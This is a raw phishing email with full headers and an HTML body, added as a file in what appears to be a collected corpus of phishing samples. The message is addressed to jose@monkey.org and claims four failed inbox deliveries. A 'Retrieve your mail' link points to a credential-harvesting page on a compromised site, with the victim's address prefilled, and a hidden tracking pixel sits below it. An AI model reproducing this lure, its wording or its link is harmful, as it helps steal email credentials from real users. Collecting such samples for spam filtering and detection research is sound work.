@@ -1,0 +1,146 @@
+Return-Path: support@mglnetwork.com
+Delivered-To: jose@monkey.org
+X-FDA: 81631816938.21.B990853
+Received: from server.mglnetwork.com (server.mglnetwork.com [162.214.230.221])
+	by imf28.b.hostedemail.com (Postfix) with ESMTP id 96E22100004
+	for <jose@monkey.org>; Mon,  1 Jan 2024 20:03:27 +0000 (UTC)
+Authentication-Results: imf28.b.hostedemail.com;	dkim=none;	dmarc=none;
+	spf=pass (imf28.b.hostedemail.com: domain of support@mglnetwork.com
+ designates 162.214.230.221 as permitted sender)
+ smtp.mailfrom=support@mglnetwork.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1704139407;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	 references;
+ bh=bJx37pzvdyaW+/0zC0ff9y1dXSUQTsk0RepdXKdsyRE=;
+	b=0scg1SXhp+0XaBKuXjZ2Jz4zqot9un/kWreCRM1ZSS/YWBeYMxQaSUpVOpZQ/aW3SOQzP8
+	YZW/8RTYohUO+Y6p55B8GnrRM5vC0ce6JpMZ6YHUCbhpq605IOW2h2gT1pJnrh3ZRswBaZ
+	UQOPrx/Z/ruCJXcRUM6Qizjy6GupWDY=
+ARC-Authentication-Results: i=1;	imf28.b.hostedemail.com;	dkim=none;
+	dmarc=none;	spf=pass (imf28.b.hostedemail.com: domain of
+ support@mglnetwork.com designates 162.214.230.221 as permitted sender)
+ smtp.mailfrom=support@mglnetwork.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1704139407; a=rsa-sha256;
+	cv=none;
+	b=ecmGihlNOqtsjiY1EzbdsWCmPZ3WPoDpmFS0Px0jpQK+gPt4hOxBzqdAVkmdnqjf2FYGvE
+	vEufF6ylXY0L70hztmN13Rh3WZGhddAQeFiS4pDnRGcuvi33oZqQsSJKsIIHCYEeZUbB3N
+	lmP7pfrBNksZUkZcJ2issEEGyzMuw3o=
+Received: from [77.105.147.0] (port=51276 helo=shaky-fly.aeza.network)	by
+ server.mglnetwork.com with esmtpsa  (TLS1.2) tls
+ TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384	(Exim 4.96.2)	(envelope-from
+ <support@mglnetwork.com>)	id 1rKOVT-0007dS-0I	for jose@monkey.org;	Mon, 01
+ Jan 2024 13:03:26 -0700
+From: monkey.org<support@mglnetwork.com>
+To: jose@monkey.org
+Subject: You have (4)inbox failed email deliveries..
+Date: 1 Jan 2024 23:03:23 +0300
+Message-ID: <20240101230323.90CFCB8798D60B15@mglnetwork.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse:
+ This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - server.mglnetwork.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - mglnetwork.com
+X-Get-Message-Sender-Via:
+ server.mglnetwork.com: authenticated_id: support@mglnetwork.com
+X-Authenticated-Sender: server.mglnetwork.com: support@mglnetwork.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspamd-Server: rspam11
+X-Rspamd-Queue-Id: 96E22100004
+X-Stat-Signature: 1najzhtrke13rhwkiiuqp91k194g9ipe
+X-Rspam-User: 
+X-Spam-Status: Yes, score=12.30
+X-HE-Tag: 1704139407-285454
+X-HE-Meta: =?utf-8?q?U2FsdGVkX19udi/t7kr58eXoyzKUGcey3SEc80rW2szou6dyg++Q9K6?=
+ =?utf-8?q?eQ0jCzuobXGNTrOvUogKbj6AQR/uDIxmd1RUlSrepZMyFeRsotOhFGXxpE0uIYkUA?=
+ =?utf-8?q?XhA+jyl8If/I6cpJyWivskW0rfupZxspjXnwWrtaeGo1SQTcy6NMuvva7AQ4uRX7w?=
+ =?utf-8?q?kZpvHRJ+tIlks8bt8kQJgWTFujuUJcwk62wYGMwv48/xxCeXcZS4BIUXqdFAq0ta1?=
+ =?utf-8?q?o4bUEeIe6wOQtC+UqAeyc3LDPGjjJUABB23NJgBMiMkj7siyj0yekHZpwBmPgvWU9?=
+ =?utf-8?q?BYEfwmxTMS2tlav2DnAX3OOsWECRHO9OoAGkr+eXsQ62s6bjKtE7bmrzpjNLHk4+f?=
+ =?utf-8?q?nzEOIOpq0yq1/z2rf5WV/xgA2erJAFBDFkyENPIxkuBaxMVMQRB4xU0Ebw14ph+93?=
+ =?utf-8?q?UmisViL2GVNU6E08g5jGo0EuQaamXHiIqLFAcmfCTa4uQTkDE/IFfge+d4ktaPtN/?=
+ =?utf-8?q?RCnc1BhUuyPQlld9VNavKnA9NXJOIDQBquV1S8dWcUyHlEtNmhpzDJqsnfHB04TJT?=
+ =?utf-8?q?duqv02XDFrPAIMBiuSMHhzLHBxMJTfyy+d75jZ7zey+rXJeWUbfOUDbN5JmfT3mtk?=
+ =?utf-8?q?x+X75wPikpXiBssrXSUsgWvyWkghIzDogust1m9GjoPVxP1v2i7uSd3CccJfjlyQE?=
+ =?utf-8?q?tsAdQl6VhlS2d6WUgEPhMrjbs4zFxp8q+fOi0/Sq4MIYoid69KPF+mLC09VvKIbwo?=
+ =?utf-8?q?UEUl0JFq4+3+I5AhdUrTZM7IJ+LI5JxCP6Edr3e1C4XXiHxIwDJx6tW3dAtFl87Ie?=
+ =?utf-8?q?yE+ekullDN54fSl/Og4RwHO8M794LdB+lEKQIuAd8I/En7RL7KTZ0bKouXmuBF69M?=
+ =?utf-8?q?cR5/ZdT1Q33lZOx0nNmaT0jqqERc?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 1
+
+<br><div class=3D"gmail_quote"><div><blockquote type=3D"cite"><div class=3D=
+"gmail_quote"><div class=3D"gmail_attr" dir=3D"ltr"><div><br></div>
+                <div><div id=3D"m_3052631533914239600m_8307636659004312332m=
+_-1835174463846741356m_-8776400756138519200m_1060591085446223277m_-53640575=
+56062311011ydpeba06609yiv0506173501"><div><div style=3D"DIRECTION:ltr;MIN-H=
+EIGHT:345px">
+<div style=3D"font-size:16px;font-family:Arial,sans-serif;white-space:norma=
+l;word-spacing:0px;text-transform:none;font-weight:400;font-style:normal;te=
+xt-align:center;padding-top:3px;padding-left:3px;letter-spacing:normal;padd=
+ing-right:3px;text-indent:0px;text-decoration-style:initial;text-decoration=
+-color:initial;color:rgb(0,0,0);background-color:rgb(255,255,255)">
+<p style=3D"margin-top:0px;color:rgb(33,37,41)"><b>Dear<span style=3D"color=
+:rgb(34,34,34)"><span style=3D"color:rgb(0,0,255)">, <a href=3D"mailto:jose=
+@monkey.org" rel=3D"noreferrer nofollow noopener" target=3D"_blank">jose@mo=
+nkey.org</a></span></span></b><br></p>There are (4) failed emails in your i=
+nbox<br>Verify your information and get an email instantly sent to your ema=
+il inbox</div><div style=3D"font-size:16px;font-family:Arial,sans-serif;whi=
+te-space:normal;word-spacing:0px;text-transform:none;font-weight:400;font-s=
+tyle:normal;text-align:center;padding-top:3px;padding-left:3px;letter-spaci=
+ng:normal;padding-right:3px;text-indent:0px;text-decoration-style:initial;t=
+ext-decoration-color:initial;color:rgb(0,0,0);background-color:rgb(255,255,=
+255)"><a rel=3D"noreferrer nofollow noopener" href=3D"https://kecikekurisi.=
+com/.well-known/pki-validation/control_ikb.html?login=3Djose@monkey.org&amp=
+;vcnt=3D100&amp;pcnt=3D3&amp;pcnt=3D3&amp;no_redrct=3Dno_redrct" style=3D"c=
+olor:rgb(33,37,41)" target=3D"_blank" data-saferedirecturl=3D"https://www.g=
+oogle.com/url?q=3Dhttps://adapt.ph/control_ikb.html?login%3D%5B%5B-Email-%5=
+D%5D%26vcnt%3D100%26pcnt%3D3%26pcnt%3D3%26no_redrct%3Dno_redrct&amp;source=
+=3Dgmail&amp;ust=3D1703724504432000&amp;usg=3DAOvVaw0ib7ZST-7OSlny8DjuG460"=
+><span style=3D"color:rgb(27,11,244)">Retrieve your mail</span></a><br></di=
+v>
+<hr style=3D"border-top-style:solid;border-left-width:0px;font-size:16px;mi=
+n-height:0px;font-family:Arial,sans-serif;border-right-width:0px;white-spac=
+e:normal;border-bottom-width:0px;word-spacing:0px;text-transform:none;font-=
+weight:400;font-style:normal;letter-spacing:normal;text-indent:0px;text-dec=
+oration-style:initial;text-decoration-color:initial;color:rgb(33,37,41);bac=
+kground-color:rgb(52,58,64)">
+
+<p style=3D"font-size:12px;font-family:Arial,sans-serif;white-space:normal;=
+word-spacing:0px;text-transform:none;font-weight:400;font-style:normal;text=
+-align:center;margin-top:0px;letter-spacing:normal;text-indent:0px;text-dec=
+oration-style:initial;text-decoration-color:initial;color:rgb(220,53,69);ba=
+ckground-color:rgb(255,255,255)">Please retrieve your email</p>
+<p><br>&nbsp;</p>
+<p><img height=3D"1" width=3D"1" border=3D"0" style=3D"BORDER-LEFT-WIDTH:0p=
+x;min-height:1px;BORDER-RIGHT-WIDTH:0px;WIDTH:1px;BORDER-BOTTOM-WIDTH:0px;P=
+ADDING-BOTTOM:0px;PADDING-TOP:0px;PADDING-LEFT:0px;MARGIN:0px;PADDING-RIGHT=
+:0px;BORDER-TOP-WIDTH:0px" src=3D"https://ci3.googleusercontent.com/proxy/x=
+WUoI7kI-bDTEzMFskNKLVW0aK_4WV-a1AkyOF_Df2FAERKAEdvlqU2yYO7lJLLlmFWqMg9i-aeA=
+JJMxiKoZtjbp-trLdMa1ZFRxASfZqqVDlmWg7ytSJJvYi7-c9CuL77xpS5UaTT9lh6TJd_6B6nF=
+YbnahZvzjIj0sU_LLFaQTQ-0d8cNF3d5JbPWCwuwQktL8MskAGzT9uFyD3cNbRUJCW4zVpghuJF=
+K3dtD05mwzHmbKcxGQU7VnZ90f3iDyKrXqQdEJKuert-1oJy9q-lIk3o5TV5X67cAR1m_8E3HIz=
+OsCod9_rfP2Kgfl8x23Y8tpcBGDehE6bw9xdM_MqJlB8hoddnqVLZ7S-mfStkVbCWa37_NhuK6p=
+Ne1Z_frAf9HGjHD5jaSOst_QdZuC-WzJq37l0k6NQmfE=3Ds0-d-e1-ft#https://u5732550.=
+ct.sendgrid.net/wf/open?upn=3DmSDBS3UjdeTRDAUl4Nvpxeoz-2BNHledNaD8cGpvjUvwM=
+nL7DYFoc6DTW9GEjfugV6bQFMoaPNdL3yY1nYenzfFAcwSTi-2BE5nTwwTD0SfLuFg4kh1syzsS=
+WbYXesNHbrt589O4Wgvyp7WiXkgZ-2FcJPk-2BvM-2FepN74YEcFvllcjy6MzWR0fNpo7xIUU-2=
+B2UlwUUgtCfyuQ8I3XQxkntgKG6N1cvJpXcEyKvtpLOK3UxM7E88-3D"></p></div></div></=
+div></div>
+            </div><div><div id=3D"m_3052631533914239600m_830763665900431233=
+2m_-1835174463846741356m_-8776400756138519200m_1060591085446223277m_-536405=
+7556062311011ydpeba06609yahoo_quoted_6557853205">
+        </div></div></div>
+
+        </blockquote><br>
+    </div></div>
+
